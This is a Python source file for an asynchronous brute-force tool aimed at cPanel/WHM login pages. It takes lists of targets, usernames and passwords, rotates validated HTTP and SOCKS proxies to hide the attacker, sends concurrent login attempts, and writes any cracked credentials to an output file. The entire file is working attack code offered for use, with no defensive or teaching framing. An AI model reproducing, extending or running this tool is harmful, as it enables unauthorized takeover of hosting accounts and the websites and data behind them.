import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
import argparse
import sys
from colorama import Fore, Style
import random

def log(message: str, level: str = "i") -> None:
    levels = {
        "i": f"{Fore.BLUE}[*]{Style.RESET_ALL}",
        "s": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
        "w": f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
        "e": f"{Fore.RED}[-]{Style.RESET_ALL}",
    }
    print(f"{levels.get(level, levels['i'])} {message}")

async def try_login(session, url, username, password, timeout, proxy=None):
    try:
        if proxy and proxy.startswith("socks"):
            connector = ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector) as proxy_session:
                async with proxy_session.post(
                    f"{url}/login/",
                    data={'user': username, 'pass': password},
                    timeout=timeout,
                    allow_redirects=False
                ) as response:
                    if response.status == 200 and 'cpsess' in str(response.url):
                        log(f"Success! Username: {username} | Password: {password} | Proxy: {proxy}", "s")
                        return True, username, password, proxy
                    else:
                        log(f"Failed: {username}:{password} | Proxy: {proxy}", "i")
                        return False, username, password, proxy
        else:
            async with session.post(
                f"{url}/login/",
                data={'user': username, 'pass': password},
                timeout=timeout,
                allow_redirects=False,
                proxy=proxy if proxy else None
            ) as response:
                if response.status == 200 and 'cpsess' in str(response.url):
                    log(f"Success! Username: {username} | Password: {password} | Proxy: {proxy or 'None'}", "s")
                    return True, username, password, proxy
                else:
                    log(f"Failed: {username}:{password} | Proxy: {proxy or 'None'}", "i")
                    return False, username, password, proxy
    except asyncio.TimeoutError:
        log(f"Timeout for {url} with {username}:{password} | Proxy: {proxy or 'None'}", "w")
        return False, username, password, proxy
    except Exception as e:
        log(f"Error at {url} with {username}:{password} | Proxy: {proxy or 'None'}: {str(e)}", "e")
        return False, username, password, proxy

async def bruteforce_target(url, usernames, passwords, output_file, concurrency, timeout, proxies):
    tasks = []
    semaphore = asyncio.Semaphore(concurrency)
    lock = asyncio.Lock()

    async with aiohttp.ClientSession() as session:
        async def bounded_try_login(u, p):
            async with semaphore:
                proxy = random.choice(proxies) if proxies else None
                result, user, pwd, used_proxy = await try_login(session, url, u, p, timeout, proxy)
                if result and output_file:
                    async with lock:
                        with open(output_file, 'a') as f:
                            f.write(f"{url} | {user}:{pwd} | Proxy: {used_proxy or 'None'}\n")
                await asyncio.sleep(0.1)
                return result

        for username in usernames:
            for password in passwords:
                tasks.append(bounded_try_login(username, password))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        return any(results)

async def main():
    parser = argparse.ArgumentParser(description="cPanel/WHM brute-force tool")
    parser.add_argument('-t', '--target', help="Target URL (single target)")
    parser.add_argument('-f', '--file', help="File containing list of targets")
    parser.add_argument('-u', '--usernames', required=True, help="File containing usernames")
    parser.add_argument('-p', '--passwords', required=True, help="File containing passwords")
    parser.add_argument('-o', '--output', help="Output file for successful results")
    parser.add_argument('-c', '--concurrency', type=int, default=5, help="Number of concurrent requests")
    parser.add_argument('-T', '--timeout', type=int, default=10, help="Timeout in seconds")
    parser.add_argument('-F', '--proxy-file', help="File containing list of proxies (http, socks4, socks5)")

    args = parser.parse_args()

    try:
        with open(args.usernames, 'r') as u_file:
            usernames = [line.strip() for line in u_file if line.strip()]
        with open(args.passwords, 'r') as p_file:
            passwords = [line.strip() for line in p_file if line.strip()]
    except Exception as e:
        log(f"Error reading input files: {str(e)}", "e")
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.file:
        try:
            with open(args.file, 'r') as t_file:
                targets.extend([line.strip() for line in t_file if line.strip()])
        except Exception as e:
            log(f"Error reading targets file: {str(e)}", "e")
            sys.exit(1)

    if not targets:
        log("No targets specified!", "e")
        sys.exit(1)

    proxies = []
    if args.proxy_file:
        try:
            with open(args.proxy_file, 'r') as p_file:
                proxies = [line.strip() for line in p_file if line.strip()]
            if not proxies:
                log("Proxy file is empty!", "e")
                sys.exit(1)
            log(f"Validating {len(proxies)} proxies...", "i")

            async def check_proxy(session, proxy, timeout):
                try:
                    if proxy.startswith("socks"):
                        connector = ProxyConnector.from_url(proxy)
                        async with aiohttp.ClientSession(connector=connector) as proxy_session:
                            async with proxy_session.get("http://httpbin.org/ip", timeout=timeout) as resp:
                                return resp.status == 200
                    else:
                        async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=timeout) as resp:
                            return resp.status == 200
                except Exception:
                    return False

            async with aiohttp.ClientSession() as session:
                tasks = [check_proxy(session, proxy, args.timeout) for proxy in proxies]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                proxies = [proxy for proxy, valid in zip(proxies, results) if valid]
            if not proxies:
                log("No valid proxies found!", "e")
                sys.exit(1)
            log(f"Found {len(proxies)} valid proxies", "s")
        except Exception as e:
            log(f"Error reading proxy file: {str(e)}", "e")
            sys.exit(1)

    targets = [t if t.startswith('http') else f"https://{t}" for t in targets]
    log(f"Starting brute-force on {len(targets)} targets", "i")

    for target in targets:
        log(f"Processing {target}", "i")
        await bruteforce_target(target, usernames, passwords, args.output, args.concurrency, args.timeout, proxies)

if __name__ == "__main__":
    asyncio.run(main())